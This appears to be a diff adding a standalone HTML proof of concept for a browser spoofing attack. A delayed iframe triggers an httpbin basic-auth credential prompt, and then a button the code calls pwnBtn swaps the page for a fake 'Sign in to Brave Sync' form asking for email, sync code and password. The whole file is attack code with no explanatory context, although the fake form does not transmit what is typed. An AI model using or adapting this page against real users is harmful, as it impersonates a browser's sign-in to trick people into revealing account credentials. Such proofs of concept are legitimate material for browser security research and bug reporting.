@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Button with Delayed iFrame</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background-color: #f5f5f5;
+      margin: 0;
+      padding: 40px;
+      text-align: center;
+    }
+
+    button {
+      font-size: 24px;
+      padding: 16px 32px;
+      border: none;
+      background-color: #007bff;
+      color: white;
+      border-radius: 8px;
+      cursor: pointer;
+      margin: 10px 0;
+    }
+
+    #container {
+      margin-top: 30px;
+    }
+
+    .login-container {
+      max-width: 400px;
+      margin: 100px auto;
+      background-color: white;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    .login-container img {
+      width: 60px;
+      margin-bottom: 20px;
+    }
+
+    .login-container h2 {
+      margin-bottom: 20px;
+    }
+
+    .login-container input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    .login-container button {
+      width: 100%;
+      padding: 16px;
+      font-size: 18px;
+      background-color: #ff7139;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <button id="loadBtn">Click me</button>
+  <div id="container"></div>
+
+  <script>
+    document.getElementById("loadBtn").addEventListener("click", () => {
+      setTimeout(() => {
+        const iframe = document.createElement("iframe");
+        iframe.srcdoc = `<iframe src="https://httpbin.org/basic-auth/user/passwd"></iframe>`;
+        iframe.style.width = "100%";
+        iframe.style.height = "300px";
+        document.getElementById("container").appendChild(iframe);
+
+        // Show the trigger button shortly after iframe loads
+        setTimeout(() => {
+          const pwnBtn = document.createElement("button");
+          pwnBtn.textContent = "Click me";
+          pwnBtn.style.fontSize = "24px";
+          pwnBtn.style.padding = "16px 32px";
+          document.body.appendChild(pwnBtn);
+
+          pwnBtn.addEventListener("click", () => {
+            document.body.innerHTML = `
+              <div class="login-container">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQoRUg0l7PMuv1byhqZ90_i41rtCfjKYpjFeA&s" alt="Brave Logo">
+                <h2>Sign in to Brave Sync</h2>
+                <input type="text" placeholder="Email or Sync Code">
+                <input type="password" placeholder="Password">
+                <button>Sign In</button>
+              </div>
+            `;
+          });
+        }, 1000);
+      }, 3000);
+    });
+  </script>
+</body>
+</html>
